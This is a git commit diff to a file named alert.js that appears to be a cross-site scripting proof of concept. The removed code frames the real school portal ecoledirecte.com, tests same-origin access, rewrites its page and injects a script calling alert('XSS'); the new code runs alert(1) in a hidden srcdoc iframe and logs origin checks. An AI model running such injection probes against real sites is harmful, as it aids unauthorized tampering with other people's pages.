c66e2ab8df576c9ef415d63f6636b482a6fd034c
Exon2007 <lelongtristan474@gmail.com>
2026-01-03 13:18:26 +0100

    Update alert.js

--- alert.js
+++ alert.js
@@ -1,48 +1,27 @@
 (() => {
-  const run = () => {
-    const iframe = document.createElement("iframe");
-    iframe.src = "https://www.ecoledirecte.com/";
-    iframe.style.width = "300px";
-    iframe.style.height = "150px";
-    document.body.appendChild(iframe);
+  const iframe = document.createElement("iframe");
+  iframe.style.display = "none";
 
-    iframe.onload = () => {
-      console.log("iframe loaded");
+  iframe.srcdoc = `
+    <!doctype html>
+    <html>
+      <body>
+        <script>
+          console.log("iframe script executing");
+          alert(1);
+        </script>
+      </body>
+    </html>
+  `;
 
-      const doc = iframe.contentDocument;
-      console.log("contentDocument accessible:", !!doc);
-
-      console.log("iframe origin:", iframe.contentWindow.location.origin);
-      console.log("parent origin:", location.origin);
-      console.log("same origin:", iframe.contentWindow.location.origin === location.origin);
-
-      const body = doc.body;
-      console.log("iframe body:", body);
-      console.log("iframe body innerHTML length:", body.innerHTML.length);
-
-      body.style.background = "red";
-      body.innerHTML = "<h1>DOM MODIFIED</h1>";
-
-      console.log("DOM modified");
-
-      const script = doc.createElement("script");
-      script.textContent = "console.log('SCRIPT EXECUTED'); alert('XSS')";
-      body.appendChild(script);
-
-      console.log("script injected");
-
-      const btn = doc.createElement("button");
-      btn.textContent = "CLICK ME";
-      btn.onclick = () => alert("clicked");
-      body.appendChild(btn);
-
-      console.log("onclick handler attached");
-    };
+  iframe.onload = () => {
+    console.log("iframe loaded");
+    console.log("contentDocument accessible:", !!iframe.contentDocument);
+    console.log("iframe origin:", iframe.contentWindow.location.origin);
+    console.log("parent origin:", window.location.origin);
+    console.log("same origin:", iframe.contentWindow.location.origin === window.location.origin);
+    console.log("iframe body:", iframe.contentDocument.body);
   };
 
-  if (document.body) {
-    run();
-  } else {
-    document.addEventListener("DOMContentLoaded", run);
-  }
+  document.documentElement.appendChild(iframe);
 })();
